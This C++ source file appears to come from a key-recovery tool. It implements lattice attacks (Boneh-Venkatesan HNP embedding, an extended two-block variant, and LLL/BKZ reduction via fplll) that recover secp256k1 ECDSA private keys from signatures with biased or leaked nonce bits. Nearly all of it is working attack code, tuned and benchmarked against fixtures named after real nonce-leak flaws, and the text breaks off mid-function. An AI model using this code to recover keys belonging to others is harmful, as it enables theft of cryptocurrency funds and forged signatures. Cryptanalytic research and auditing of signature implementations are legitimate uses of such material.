#include "lattice_solver.h"
#include "utils.h"
#include <fplll.h>
#include <iostream>
#include <cmath>
#include <vector>
#include <algorithm>
#include <cstdlib>

using namespace fplll;

// Hard ceiling on the lattice-training sample size (and therefore on
// dimension, since dim = train_m + 1). The previous value (120) was set
// around L=2's timing wall, but direct measurement later showed it was
// silently strangling the *mid* range too: a real L=4 instance does not
// resolve at dim 121 or 161, yet solves cleanly at dim 221 (block_size 30,
// ~57s) and dim 301 (~102s). The practical dimension a leak level L needs
// is roughly 3.5 * (256/L) -- well above the bare 256/L margin -- so the old
// cap put L<=4 permanently out of reach for no reason other than the ceiling.
// Raised to 320 so the Phase-2 plan below can provision the mid range
// (L=4..6): L=5/L=6 resolve robustly at block 30, L=4 is best-effort with a
// pair of dimension shots up to ~300. L<=3 needs both higher dimension *and*
// a larger block size than block 30, so it stays out of reach (the full
// frontier data is in the project's internal design notes). The time-budget
// guards further down still stop
// any single trial that won't fit --max-time from starting, so a bigger
// ceiling costs nothing when the budget is tight.
constexpr size_t TRAIN_M_CAP = 320;

// Harvest breadth for the NO-PUBKEY best-effort path only (the pubkey path is
// uncapped). Measured, not assumed: across the Tier-0 FAST MSB/LSB corpus the
// verified key's norm-rank never exceeded 0 (M1, scripts/measure_norm_rank.py),
// and the capped no-pubkey scoring path recovers msb_L9_putty_58 and
// msb_L8_tpmfail_1000 at this value (M2, test_nopubkey_capped.py).
// Caveat: every FAST-corpus recovery landed at norm-rank 0, so no case here
// exercises depth > 0 -- 128 is therefore defensive headroom for the untested
// weak-bias / high-dimension (dim ~300) regime this norm-ordering targets, not
// headroom over a measured nonzero max. The per-failing-trial cost is bounded
// (~128 extra candidate checks), so a generous cap matches the project's
// thoroughness-over-speed directive.
constexpr size_t TOP_N_ROWS = 128;

namespace {

// fplll's plain bkz_reduction(basis, block_size, flags) convenience call
// builds a BKZParam with an *empty* strategies vector -- fplll's own
// BKZParam constructor then defaults every block to Strategy::EmptyStrategy,
// whose PruningParams is documented in fplll's own source as "means no
// pruning": every block runs full, unpruned, exhaustive enumeration, the
// most expensive mode that exists. Measured directly against this project's
// own lattice construction: block_size=30 at dim~161 (the weak-bias case
// that motivated TRAIN_M_CAP above) never finished in 20 minutes unpruned;
// loading fplll's own bundled, pre-tuned pruning strategy -- the same one
// its command-line tool loads by default -- brought the identical instance
// down to ~18 seconds. That's two orders of magnitude at the *same*
// reduction strength, not a quality tradeoff, so there's no reason not to
// use it whenever it's available. Falls back to empty (old, slower but
// still correct, unpruned) behavior if none of these paths exist, rather
// than failing outright -- pruning is a speed optimization, not a
// correctness requirement.
// Cached: the JSON is parsed once on first use and reused. Phase 2 issues
// several BKZ reductions per recovery, so re-reading the strategy file from
// disk on every call (the old behaviour) was pointless I/O in a hot path.
//
// Path resolution order: the ECDSA_FPLLL_STRATEGY env var (an explicit
// override, so packagers/CI can point at a strategy file that isn't in a
// standard prefix) is tried first, then the usual install locations. The
// hard-coded absolute paths were previously the *only* way to find the file,
// which made the build brittle across distros/prefixes; the override removes
// that as a single point of failure without changing default behaviour.
const std::vector<fplll::Strategy>& load_bkz_pruning_strategies() {
    static const std::vector<fplll::Strategy> cached = []() {
        std::vector<std::string> candidates;
        if (const char* env = std::getenv("ECDSA_FPLLL_STRATEGY");
            env != nullptr && env[0] != '\0') {
            candidates.emplace_back(env);
        }
        candidates.insert(candidates.end(), {
            "/usr/local/share/fplll/strategies/default.json",
            "/usr/share/fplll/strategies/default.json",
            "/usr/share/libfplll8/strategies/default.json",
        });
        for (const auto& path : candidates) {
            try {
                return fplll::load_strategies_json(path);
            } catch (const std::exception&) {
                continue;
            }
        }
        return std::vector<fplll::Strategy>{};
    }();
    return cached;
}

} // namespace

// HNP lattice embedding via pivot elimination + Kannan CVP->SVP embedding.
//
// The relation for each signature is k_i = w_i + x_i*d (mod N), with the
// bias assumption 0 <= k_i < 2^(256 - leaked_bits) (leaked_bits = number of
// known/zero top bits). The previous version of this function tried to put
// d itself into the lattice (scaled by 2^leaked_bits on the diagonal and in
// the x-column). That does not work: d spans the *full* group order (~2^256)
// regardless of any nonce bias, so no scaling of the surrounding basis makes
// the vector containing d actually short -- empirically its norm came out
// the same order of magnitude as a trivial basis row (~N), so LLL/BKZ had no
// signal to latch onto no matter which leaked_bits value was supplied.
//
// This version never puts d in the lattice. Instead it eliminates d first:
// picking pairs[0] as a pivot, for i = 1..m-1 we have
//   k_i - x_i*d ≡ w_i  and  k_0 - x_0*d ≡ w_0   (mod N)
// Multiplying the first by x_0 and the second by x_i and subtracting cancels
// d entirely:
//   x_0*k_i - x_i*k_0 ≡ x_0*w_i - x_i*w_0  (mod N)
// Dividing through by x_0 (invertible mod N):
//   k_i ≡ a_i*k_0 + t_i  (mod N),   a_i = x_i*x_0^{-1},  t_i = w_i - a_i*w_0
//
// This is now a textbook single-hidden-number HNP instance in the *small*
// unknown k_0 (bounded by the same 2^(256-leaked_bits) as every other
// nonce), with a_i, t_i computable from public data alone. We embed it as a
// CVP instance (lattice generated by N*e_i rows, target vector (t_i)) and
// convert to SVP via a Kannan embedding row/column scaled by M ~ the
// expected residual size. A genuinely short reduced vector then reveals
// k_0 directly in one column, and d = (k_0 - w_0) * x_0^{-1} mod N follows
// from a single back-substitution -- no scanning of arbitrary matrix
// entries required.
//
// Lattice dimension: n = m-1 relations -> dim = n + 2 = m + 1
//   columns 0..n-1  : residual (k_i) dimensions
//   column  n       : k_0 dimension
//   column  n+1     : Kannan embedding dimension
bool LatticeSolver::build_boneh_venkatesan_basis(
    const std::vector<Pair>& pairs,
    int leaked_bits,
    ZZ_mat<mpz_t>& basis,
    mpz& scaling_factor
) {
    size_t m = pairs.size();
    if (m < 4) return false; // need a pivot + at least 3 relations to be meaningful

    mpz N = SECP256K1_N;
    const Pair& pivot = pairs[0];

    mpz x0inv = utils::mod_inverse(pivot.x, N);
    if (x0inv == 0) return false;

    size_t n = m - 1;
    int dim = static_cast<int>(n) + 2;
    basis.resize(dim, dim);

    for (int r = 0; r < dim; ++r)
        for (int c = 0; c < dim; ++c)
            mpz_set_ui(basis[r][c].get_data(), 0);

    std::vector<mpz> a(n), t(n);
    for (size_t idx = 0; idx < n; ++idx) {
        const Pair& p = pairs[idx + 1];
        a[idx] = utils::mod_mul(p.x, x0inv, N);
        mpz aw0 = utils::mod_mul(a[idx], pivot.w, N);
        mpz diff = (p.w - aw0) % N;
        if (diff < 0) diff += N;
        t[idx] = diff;
    }

    // Expected magnitude of the small unknowns (k_0, and the residuals
    // once correctly resolved): ~2^(256 - leaked_bits). Used purely to
    // scale the embedding dimension so LLL/BKZ can compare it fairly
    // against the N-sized dimensions; it does not need to be exact.
    int l_bound = std::max(8, std::min(252, 256 - leaked_bits));
    mpz M = mpz(1) << l_bound;
    scaling_factor = M;

    for (size_t r = 0; r < n; ++r) {
        mpz_set(basis[r][r].get_data(), N.get_mpz_t());
    }

    for (size_t c = 0; c < n; ++c) {
        mpz_set(basis[n][c].get_data(), a[c].get_mpz_t());
    }
    mpz_set_ui(basis[n][n].get_data(), 1);

    // Recentering (standard centered-HNP / Nguyen-Shparlinski trick). Without
    // it, the target vector's residual coordinates are the raw nonces k_j,
    // which are all *non-negative* and bounded by B = 2^(256-leaked_bits):
    // uniform on [0, B), so E[k_j^2] = B^2/3. Subtracting the interval
    // midpoint c = B/2 from each embedding constant t_j shifts those same
    // coordinates to k_j - c in [-B/2, B/2), giving E[coord^2] = B^2/12 -- a
    // 2x shorter target on the n dominant coordinates, i.e. one full bit of
    // extra lattice margin, at zero cost: the determinant (N^n * M) is
    // unchanged since it doesn't depend on the t-row values, so the gap
    // lambda_2/lambda_1 improves by the same ~2x. That one bit is exactly the
    // quantity that decides feasibility right at the L=2/L=3 threshold for
    // 256-bit (dim ~ 256/L), where the target is otherwise only marginally
    // shorter than the reduced-basis bulk. The k_0 column (col n) is left
    // uncentered on purpose -- it is a single coordinate out of ~dim, so
    // centering it too is negligible, and leaving col n untouched keeps
    // reduce_and_extract's k_0 read (basis[row][k0_col]) valid unchanged.
    mpz center = M >> 1;
    for (size_t c = 0; c < n; ++c) {
        mpz shifted = t[c] - center;
        mpz_set(basis[n + 1][c].get_data(), shifted.get_mpz_t());
    }
    mpz_set(basis[n + 1][n + 1].get_data(), M.get_mpz_t());

    return true;
}

std::optional<mpz> LatticeSolver::reduce_and_extract(
    ZZ_mat<mpz_t>& basis,
    const std::vector<Pair>& pairs_in,
    Telemetry* telemetry,
    int bkz_block_size,
    const mpz& pubkey_hint
) {
    if (basis.get_rows() == 0) return std::nullopt;

    int dim = basis.get_rows();

    if (telemetry) {
        telemetry->lattice_dim = dim;
    }

    bool success;
    if (bkz_block_size > 0) {
        // BKZ escalation: strictly stronger reduction than plain LLL at
        // the same delta, at significantly higher cost (roughly
        // exponential in block size), used only when LLL's result
        // doesn't already look convincing -- see recover_private_key.
        // Uses fplll's bundled pruning strategy when available -- see
        // load_bkz_pruning_strategies() above for why that matters as much
        // as it does (measured ~100x+ speedup at the same block size).
        if (telemetry) telemetry->set_phase("Running BKZ reduction (block size " + std::to_string(bkz_block_size) + ")");
        // Copy from the cached parse (BKZParam wants a mutable vector); the
        // expensive part -- reading and parsing the JSON -- is cached.
        std::vector<fplll::Strategy> strategies = load_bkz_pruning_strategies();
        int status;
        if (!strategies.empty()) {
            BKZParam param(bkz_block_size, strategies);
            status = bkz_reduction(&basis, nullptr, param);
        } else {
            status = bkz_reduction(basis, bkz_block_size, BKZ_DEFAULT);
        }
        success = (status == RED_SUCCESS);
    } else {
        if (telemetry) telemetry->set_phase("Running LLL reduction");
        ZZ_mat<mpz_t> u, u_inv;
        u.resize(0, 0);
        u_inv.resize(0, 0);
        Wrapper wrapper(basis, u, u_inv, 0.99, 0.51, LLL_DEFAULT);
        success = wrapper.lll();
    }

    if (!success) {
        if (telemetry) telemetry->set_error(bkz_block_size > 0 ? "BKZ reduction failed" : "LLL reduction failed");
        return std::nullopt;
    }

    if (telemetry) {
        telemetry->set_phase("Reduction complete, searching short vectors + PubKey test");
    }

    mpz N = SECP256K1_N;
    size_t m = pairs_in.size();
    if (m < 4) return std::nullopt;

    std::optional<mpz> best_d;

    // Embedding layout (see build_boneh_venkatesan_basis): n = m-1, column
    // index n (== m-1) holds the k_0 coefficient in every basis vector. A
    // genuinely short reduced row encodes k_0 there directly; d follows via
    // a single back-substitution against the pivot pair, d = (k_0 - w_0) *
    // x_0^{-1} mod N. We don't know the sign Kannan's embedding settles on,
    // so try both +value and -value for each row.
    size_t k0_col = m - 1;

    const Pair& pivot = pairs_in[0];
    mpz x0inv = utils::mod_inverse(pivot.x, N);
    if (x0inv == 0) return std::nullopt;

    // ---- Norm-order the reduced rows, shortest first. LLL/BKZ do NOT emit rows
    // sorted by norm (only b_0 is reliably shortest), so basis-order traversal can
    // bury a short k_0-encoding vector past the harvest cap. Sorting by exact mpz
    // squared norm -- stable, tiebroken on original row index -> fully
    // deterministic (invariant 4) -- makes the harvest keep the SHORTEST vectors
    // and lets the pubkey check hit the most likely rows first. ----
    std::vector<mpz> row_norm2(dim);
    for (int row = 0; row < dim; ++row) {
        mpz acc(0), v;
        for (int col = 0; col < dim; ++col) {
            mpz_set(v.get_mpz_t(), basis[row][col].get_data());
            acc += v * v;
        }
        row_norm2[row] = acc;
    }
    std::vector<int> order(dim);
    for (int i = 0; i < dim; ++i) order[i] = i;
    std::stable_sort(order.begin(), order.end(),
                     [&](int a, int b) { return row_norm2[a] < row_norm2[b]; });

    const bool have_pubkey = (pubkey_hint > 1);
    std::vector<mpz> candidates;

    // Push a candidate d (dedup + range guard). On the pubkey path, verify inline;
    // on a hit, record the norm-rank and signal the caller to return immediately.
    auto add_candidate = [&](const mpz& d_cand, int norm_rank) -> bool {
        if (d_cand <= 1 || d_cand >= N - 1) return false;
        for (const auto& c : candidates) if (c == d_cand) return false;  // dup
        candidates.push_back(d_cand);
        if (have_pubkey && utils::verify_pubkey(d_cand, pubkey_hint)) {
            if (telemetry) telemetry->verified_row_norm_rank = norm_rank;
            return true;   // verified -> caller returns d_cand
        }
        return false;
    };

    // Stage 1: k_0-column harvest, norm-ordered. Uncapped on the pubkey path
    // (never truncate a verifiable key); capped at TOP_N_ROWS rows without a
    // pubkey (no ground truth to early-return on).
    for (int rank = 0; rank < dim; ++rank) {
        if (!have_pubkey && rank >= static_cast<int>(TOP_N_ROWS)) break;
        int row = order[rank];
        mpz raw;
        mpz_set(raw.get_mpz_t(), basis[row][k0_col].get_data());
        if (raw == 0) continue;
        for (int sign = 0; sign < 2; ++sign) {
            mpz k0 = sign == 0 ? raw : -raw;
            k0 %= N; if (k0 < 0) k0 += N;
            mpz d_cand = (k0 - pivot.w) % N; if (d_cand < 0) d_cand += N;
            d_cand = utils::mod_mul(d_cand, x0inv, N);
            if (add_candidate(d_cand, rank)) return d_cand;
        }
    }

    // Stage 2: cell-scan insurance -- non-k_0 cells taken directly as candidate d,
    // in case useful structure landed off the dedicated column. Norm-ordered rows.
    // BOUNDED by TOP_N_ROWS candidates on BOTH paths (best-effort insurance; an
    // uncapped junk-cell scan at dim~300 would verify ~dim^2 values -- see the
    // plan's Spec Refinements).
    //
    // Stage 2 gets its own TOP_N_ROWS-slot budget, independent of how many
    // candidates Stage 1 already produced (Stage 1's rank cap does not bound
    // candidate COUNT, so a shared size cap would starve this scan entirely).
    const size_t cell_scan_limit = candidates.size() + TOP_N_ROWS;
    for (int rank = 0; rank < dim && candidates.size() < cell_scan_limit; ++rank) {
        int row = order[rank];
        for (int col = 0; col < dim && candidates.size() < cell_scan_limit; ++col) {
            if (col == static_cast<int>(k0_col)) continue;
            mpz val;
            mpz_set(val.get_mpz_t(), basis[row][col].get_data());
            if (val == 0) continue;
            if (val < 0) val = -val;
            if (val >= N) val %= N;
            if (add_candidate(val, rank)) return val;
        }
    }

    // Simple heuristic: prefer candidates that make many k "small"
    mpz best_cand(0);
    int best_score = -1;

    for (auto& cand : candidates) {
        int score = 0;
        for (size_t i = 0; i < std::min<size_t>(pairs_in.size(), 12); ++i) {
            mpz xd = utils::mod_mul(pairs_in[i].x, cand, N);
            mpz k = utils::mod_add(pairs_in[i].w, xd, N);

            // Count how "small" the k is (number of leading zero bits)
            int lz = 0;
            mpz t = k;
            while (t > 0 && lz < 30) {
                if ((t & (mpz(1) << (255 - lz))) == 0) lz++;
                else break;
            }
            score += lz;
        }

        if (score > best_score) {
            best_score = score;
            best_cand = cand;
        }
    }

    if (best_cand > 1 && best_cand < N-1) {
        best_d = best_cand;
    }

    return best_d;
}

// ---- Phase 6c: Extended-HNP (two-block) lattice for modulo / windowed bias ----
//
// Model: nonce k = lambda + omega * mu, with 0 <= lambda < bound (the small,
// known-range low window) and 0 <= mu < ~N/omega (the free high part). The HNP
// relation is k ≡ w + x*d (mod N), i.e. per signature i:
//     x_i*d - lambda_i - omega*mu_i + w_i ≡ 0  (mod N).
// Unknowns: d, and per signature lambda_i (small) and mu_i (large). We build the
// primal lattice of these unknowns with each coordinate normalized to ~2^256 by
// a diagonal weight, force the mod-N congruences to zero with a big multiplier K
// (Kannan CVP->SVP embedding), and read d out of its dedicated coordinate column
// of the short vector. Centering each unknown around its interval midpoint (the
// off_* terms) halves the target norm, exactly as build_boneh_venkatesan_basis
// does for the single-block case. Every candidate is checked against pubkey_hint,
// so a wrong (omega,bound) guess or an under-reduced basis simply fails to verify
// -- it can never emit a wrong key. Derived and numerically validated in isolation
// before landing (synthetic HNP instances; wide windows recover under LLL, narrow
// under BKZ), see the project's design notes.
//
// Dimension is 3u+2 for u signatures (vs u+1 for the single-block basis): d, u
// lambda coords, u mu coords, u mod-N rows, plus one embedding row/col.
namespace {

struct EhnpWeights {
    mpz g_d, g_lam, g_mu, g_1;    // per-coordinate normalizers (~2^256 each)
    mpz off_lam, off_mu, off_d;   // centering offsets (interval midpoints)
    mpz Bmu;                      // mu bound ~ N/omega
    size_t u, D;                  // signatures used, lattice dimension
    size_t cd, clam, cmu, cemb;   // column offsets
};

bool build_ehnp_basis(const std::vector<Pair>& pairs, size_t u,
                      const mpz& omega, const mpz& bound,
                      ZZ_mat<mpz_t>& B, EhnpWeights& W) {
    const mpz N = SECP256K1_N;
    if (u < 8 || pairs.size() < u) return false;

    W.u = u;
    W.D = 3 * u + 2;
    W.cd = u;
    W.clam = u + 1;
    W.cmu = 2 * u + 1;
    W.cemb = 3 * u + 1;

    const mpz TWO256 = mpz(1) << 256;
    W.Bmu = (N / omega) + 1;
    W.g_d = 1;
    W.g_lam = TWO256 / bound;          // lambda*g_lam ~ 2^256
    W.g_mu = TWO256 / W.Bmu;           // mu*g_mu ~ 2^256
    W.g_1 = TWO256;
    W.off_lam = bound >> 1;
    W.off_mu = W.Bmu >> 1;
    W.off_d = N >> 1;

    const mpz K = mpz(1) << 520;       // >> N: forces the eq columns to zero
    const mpz KN = K * N;

    int dim = static_cast<int>(W.D);
    B.resize(dim, dim);
    for (int r = 0; r < dim; ++r)
        for (int c = 0; c < dim; ++c)
            mpz_set_ui(B[r][c].get_data(), 0);

    auto keq = [&](const mpz& coeff_mod_n) {  // K*(coeff mod N), reduced mod K*N
        mpz v = coeff_mod_n % N; if (v < 0) v += N;
        v *= K; v %= KN; if (v < 0) v += KN;
        return v;
    };

    size_t row = 0;
    // d-row: eq_i = K*x_i ; coord col d = g_d
    for (size_t i = 0; i < u; ++i) mpz_set(B[row][i].get_data(), keq(pairs[i].x).get_mpz_t());
    mpz_set(B[row][W.cd].get_data(), W.g_d.get_mpz_t());
    row++;
    // lambda rows: eq_i = -K ; coord col lam_i = g_lam
    mpz neg1 = N - 1;
    for (size_t i = 0; i < u; ++i) {
        mpz_set(B[row][i].get_data(), keq(neg1).get_mpz_t());
        mpz_set(B[row][W.clam + i].get_data(), W.g_lam.get_mpz_t());
        row++;
    }
    // mu rows: eq_i = -K*omega ; coord col mu_i = g_mu
    mpz neg_omega = (N - (omega % N)) % N;
    for (size_t i = 0; i < u; ++i) {
        mpz_set(B[row][i].get_data(), keq(neg_omega).get_mpz_t());
        mpz_set(B[row][W.cmu + i].get_data(), W.g_mu.get_mpz_t());
        row++;
    }
    // mod-N rows: eq_i = K*N (lets LLL subtract the modulus)
    for (size_t i = 0; i < u; ++i) { mpz_set(B[row][i].get_data(), KN.get_mpz_t()); row++; }
    // target row: eq_i = K*cst_i, cst_i = w_i + x_i*off_d - off_lam - omega*off_mu
    for (size_t i = 0; i < u; ++i) {
        mpz cst = pairs[i].w + utils::mod_mul(pairs[i].x, W.off_d, N)
                  - W.off_lam - utils::mod_mul(omega, W.off_mu, N);
        mpz_set(B[row][i].get_data(), keq(cst).get_mpz_t());
    }
    mpz_set(B[row][W.cemb].get_data(), W.g_1.get_mpz_t());
    return true;
}

// Extract d candidates from a reduced EHNP basis: the row bearing the centered
// target has embed col == +/- g_1 (target-row coefficient +/-1); its d column,
// undivided by g_d(==1) and un-centered by off_d, is d.
std::vector<mpz> extract_ehnp_candidates(const ZZ_mat<mpz_t>& B, const EhnpWeights& W) {
    const mpz N = SECP256K1_N;
    std::vector<mpz> out;
    for (size_t r = 0; r < W.D; ++r) {
        mpz emb; mpz_set(emb.get_mpz_t(), B[r][W.cemb].get_data());
        if (emb == 0) continue;
        mpz scoeff = emb / W.g_1;
        if (emb % W.g_1 != 0) continue;
        if (scoeff != 1 && scoeff != -1) continue;
        mpz dcoord; mpz_set(dcoord.get_mpz_t(), B[r][W.cd].get_data());
        mpz dprime = (dcoord / W.g_d) * scoeff;   // scoeff in {+1,-1}
        mpz dcand = (dprime + W.off_d) % N; if (dcand < 0) dcand += N;
        if (dcand > 1 && dcand < N - 1) out.push_back(dcand);
    }
    return out;
}

} // namespace

std::optional<mpz> LatticeSolver::recover_modulo(
    const std::vector<Pair>& pairs,
    const mpz& omega,
    const mpz& bound,
    size_t max_signatures,
    Telemetry* telemetry,
    const mpz& pubkey_hint
) {
    const mpz N = SECP256K1_N;
    if (omega <= bound || bound < 1 || omega >= N) return std::nullopt;

    // Leaked window width in bits ~ log2(omega/bound). Below ~5 bits the lattice
    // gap is too small to resolve in any practical budget (mirrors MSB L<=3).
    double window = std::log2(mpz_get_d(omega.get_mpz_t()) /
                              std::max(1.0, mpz_get_d(bound.get_mpz_t())));
    if (window < 5.0) return std::nullopt;

    size_t avail = pairs.size();
    if (max_signatures) avail = std::min(avail, max_signatures);

    // Signatures needed: total leaked bits u*window must clear the 256-bit key
    // with margin. ~2.2x the bare information bound (256/window) resolves
    // reliably (validated on synthetic instances). Use exactly that many when
    // available -- a wide window needs only a handful, so DON'T impose a flat
    // floor (that was the bug: it demanded 40 sigs even for a 40-bit window that
    // needs ~16). Cap u so the 3u+2 dimension stays tractable for LLL/BKZ.
    size_t needed = static_cast<size_t>(std::ceil(2.2 * 256.0 / window));
    size_t u = std::min<size_t>({avail, needed, static_cast<size_t>(90)});
    // Reject instances with too little total leakage to have a real chance
    // (below ~1.3x the information bound the target isn't the short vector).
    if (u < 8 || static_cast<double>(u) * window < 256.0 * 1.3) return std::nullopt;

    auto try_candidates = [&](const std::vector<mpz>& cands) -> std::optional<mpz> {
        for (const auto& d : cands) {
            if (pubkey_hint > 1) {
                if (utils::verify_pubkey(d, pubkey_hint)) return d;
            }
        }
        // No pubkey: score by how many nonces land in the window [0,bound) mod
        // omega, accept only a near-perfect fit (best-effort, still gated by the
        // engine's own Verifier downstream).
        if (pubkey_hint <= 1) {
            for (const auto& d : cands) {
                size_t hit = 0, tested = std::min<size_t>(u, 30);
                for (size_t i = 0; i < tested; ++i) {
                    mpz k = utils::mod_add(pairs[i].w, utils::mod_mul(pairs[i].x, d, N), N);
                    mpz res = k % omega; if (res < 0) res += omega;
                    if (res < bound) hit++;
                }
                if (hit == tested) return d;
            }
        }
        return std::nullopt;
    };

    // Reduction ladder: LLL first (resolves wide windows fast), then a bounded
    // BKZ escalation for narrower windows. Every rung is pubkey-gated, so a rung
    // that under-reduces just falls through to the next. Kept short: EHNP BKZ at
    // this dimension is expensive, so we only start a rung that fits the budget.
    struct Rung { int block; };
    std::vector<Rung> ladder = {{0}, {20}, {30}};
    for (const auto& rung : ladder) {
        if (telemetry && telemetry->deadline_exceeded()) break;
        // BKZ rungs are minute-scale at this dimension; skip if clearly no budget.
        if (rung.block > 0 && telemetry && telemetry->remaining_budget_seconds() < 90.0) continue;

        ZZ_mat<mpz_t> B;
        EhnpWeights W;
        if (!build_ehnp_basis(pairs, u, omega, bound, B, W)) return std::nullopt;

        if (telemetry) {
            telemetry->lattice_dim = static_cast<size_t>(W.D);
            telemetry->signatures_used = u;
            telemetry->current_block_size = rung.block;
            telemetry->lattice_in_progress = true;
            telemetry->set_phase(std::string("EHNP (modulo) reduction ") +
                                 (rung.block > 0 ? "BKZ b=" + std::to_string(rung.block) : "LLL"));
        }

        bool ok;
        if (rung.block > 0) {
            std::vector<fplll::Strategy> strategies = load_bkz_pruning_strategies();
            int status;
            if (!strategies.empty()) {
                BKZParam param(rung.block, strategies);
                status = bkz_reduction(&B, nullptr, param);
            } else {
                status = bkz_reduction(B, rung.block, BKZ_DEFAULT);
            }
            ok = (status == RED_SUCCESS);
        } else {
            ZZ_mat<mpz_t> uu, uinv; uu.resize(0, 0); uinv.resize(0, 0);
            Wrapper wrapper(B, uu, uinv, 0.99, 0.51, LLL_DEFAULT);
            ok = wrapper.lll();
        }

        if (telemetry) telemetry->lattice_in_progress = false;
        if (!ok) continue;

        if (auto found = try_candidates(extract_ehnp_candidates(B, W))) return found;
    }

    return std::nullopt;
}

std::optional<mpz> LatticeSolver::recover_private_key(
    const std::vector<Pair>& pairs,
    const BiasProfile& bias,
    size_t max_signatures,
    Telemetry* telemetry,
    const mpz& pubkey_hint
) {
    if (pairs.empty()) return std::nullopt;

    size_t use_count = pairs.size();
    if (max_signatures > 0) use_count = std::min(use_count, max_signatures);

    // Used only for scoring candidates against real data (independent of
    // any particular trial's lattice-training subsample, which is sized
    // per-L below since weak bias needs a much bigger lattice).
    size_t scoring_m = std::min(use_count, static_cast<size_t>(200));
    std::vector<Pair> used_pairs(pairs.begin(), pairs.begin() + scoring_m);

    double leaked = bias.estimated_leaked_bits;
    if (leaked < 1.0) leaked = 8.0;

    // Recovery runs in two phases, because the leak levels split cleanly by
    // what reduction they need (measured directly against real ground-truth
    // fixtures; the full frontier data lives in the project's design notes):
    //   * Strong/moderate bias (L>=7) resolves under plain LLL at modest
    //     dimension in well under a second.
    //   * The mid range (L=4..6) will NOT resolve under LLL at any dimension
    //     -- it needs BKZ *and* a much larger lattice (L=4 needs dim ~221).
    //   * Weak bias (L<=3) needs a still-larger block size than the
    //     escalation ceiling grants and stays out of reach here.
    // So Phase 1 is a fast, broad LLL sweep (catches the common case cheaply),
    // and Phase 2 is a small, ordered BKZ sweep over just the mid range at
    // full per-L dimension. Keeping Phase 2 small is deliberate: a broad
    // high-dimension BKZ sweep would blow any realistic --max-time budget.
    //
    // Concurrency: these trials are independent and look parallelizable, but
    // the reductions run STRICTLY SERIALLY on purpose. fplll is not thread-safe
    // for concurrent reductions -- its LLL Wrapper auto-adjusts a *process-global*
    // MPFR precision, and BKZ calls LLL internally, so two reductions in flight
    // race on that global and crash non-deterministically. A thread-pool version
    // was built and reverted for exactly this reason. If this is ever
    // parallelized, the only safe route is process-based (fork) isolation so
    // each worker gets its own fplll globals -- not threads.
    int base_l = std::max(2, static_cast<int>(std::round(leaked)));

    mpz best_cand(0);
    int best_score = -1;
    bool is_lsb = (bias.type == BiasType::LSB);

    if (telemetry) {
        // 12 Phase-1 LLL trials + up to 4 Phase-2 BKZ trials (see below).
        telemetry->total_attempts = 16;
        telemetry->current_attempt = 0;
    }

    // Score a candidate against the *original* (untransformed) pairs using
    // a threshold derived from this trial's own leak value l -- used only
    // for the best-effort path when no pubkey is available to verify against.
    auto score_candidate = [&](const mpz& cand, int l) -> int {
        int score = 0;
        if (is_lsb) {
            mpz mod = mpz(1) << l;
            for (size_t i = 0; i < std::min<size_t>(used_pairs.size(), 20); ++i) {
                mpz xd = utils::mod_mul(used_pairs[i].x, cand, SECP256K1_N);
                mpz k = utils::mod_add(used_pairs[i].w, xd, SECP256K1_N);
                // A correct key reproduces each nonce's known low-bit residue.
                // For the default LSB-zero case known_low_value is 0, so this
                // is exactly the original "low l bits are zero" test.
                mpz expected = used_pairs[i].known_low_value % mod;
                mpz diff = (k % mod - expected) % mod;
                if (diff < 0) diff += mod;
                if (diff == 0) score += 3;
                else if (diff < (mod >> 2)) score += 1;
            }
        } else {
            // Threshold at the trial's own leak level. (Previously floored at
            // 3, which under-scored a correct L=2 key -- half its nonces fall
            // above 2^253 -- and made cross-L partial scores incomparable.
            // Only matters on the no-pubkey best-effort path now that verified
            // candidates short-circuit.)
            int est = std::max(2, l);
            mpz thresh = mpz(1) << (256 - est);
            for (size_t i = 0; i < std::min<size_t>(used_pairs.size(), 20); ++i) {
                mpz xd = utils::mod_mul(used_pairs[i].x, cand, SECP256K1_N);
                mpz k = utils::mod_add(used_pairs[i].w, xd, SECP256K1_N);
                if (k < thresh) score += 3;
                if (k < (thresh >> 1)) score += 2;
            }
        }
        return score;
    };
    int max_possible_score = static_cast<int>(std::min<size_t>(used_pairs.size(), 20)) * (is_lsb ? 3 : 5);

    // Shared trial runner: build the lattice for leak level l on train_m
    // pairs, reduce (LLL if block==0, else BKZ at that block size), and check
    // the extracted candidates. Returns the key immediately if one verifies
    // against the pubkey (definitive); otherwise records the best-scoring
    // candidate for the no-pubkey best-effort path and returns nullopt.
    auto run_trial = [&](int l, size_t train_m, int block) -> std::optional<mpz> {
        l = std::max(2, std::min(l, 24));
        train_m = std::min(train_m, use_count);
        if (train_m < 4) return std::nullopt;
        std::vector<Pair> train_pairs(pairs.begin(), pairs.begin() + train_m);
        // For LSB bias, transform by 2^-l mod N first -- see
        // utils::transform_pairs_lsb for why that is exact, not approximate.
        std::vector<Pair> trial_pairs = is_lsb ? utils::transform_pairs_lsb(train_pairs, l) : train_pairs;

        ZZ_mat<mpz_t> basis;
        mpz scaling;
        if (!build_boneh_venkatesan_basis(trial_pairs, l, basis, scaling)) return std::nullopt;

        if (telemetry) {
            telemetry->current_attempt = telemetry->current_attempt.load() + 1;
            telemetry->signatures_used = train_pairs.size();
            telemetry->current_leak_l = l;
            telemetry->current_block_size = block;
            telemetry->lattice_in_progress = true;
            telemetry->set_phase((block > 0 ? "Reducing lattice (BKZ) l=" : "Reducing lattice (LLL) l=") + std::to_string(l));
        }

        auto cand = reduce_and_extract(basis, trial_pairs, telemetry, block, pubkey_hint);

        if (telemetry) telemetry->lattice_in_progress = false;

        if (cand.has_value() && *cand > 1 && *cand < SECP256K1_N - 1) {
            // A pubkey-verified candidate is definitively correct -- accept
            // immediately rather than trusting the leading-zero scoring
            // heuristic (which can rank a wrong candidate above the right one).
            if (pubkey_hint > 1 && utils::verify_pubkey(*cand, pubkey_hint)) return *cand;
            int score = score_candidate(*cand, l);
            if (score > best_score) {
                best_score = score;
                best_cand = *cand;
            }
        }
        return std::nullopt;
    };

    // ---- Phase 1: fast LLL sweep over strong/moderate leak levels ----
    // Deliberately modest dimension (<=120): strong bias resolves under LLL
    // almost instantly, so this stays the cheap common path. Weak L will not
    // resolve here -- that is Phase 2's job.
    std::vector<int> lll_trials = {8, 10, 12, 7, 9, 11, 14, 16, 18, 20, 24};
    lll_trials.push_back(base_l);
    for (int l : lll_trials) {
        if (telemetry && telemetry->deadline_exceeded()) break;
        size_t train_m = std::min<size_t>({use_count, static_cast<size_t>(120),
                          std::max<size_t>(80, static_cast<size_t>(std::ceil(320.0 / std::max(1, l))))});
        if (telemetry && train_m > 100 && telemetry->remaining_budget_seconds() < 30.0) continue;
        auto found = run_trial(l, train_m, 0);
        if (found) return *found;
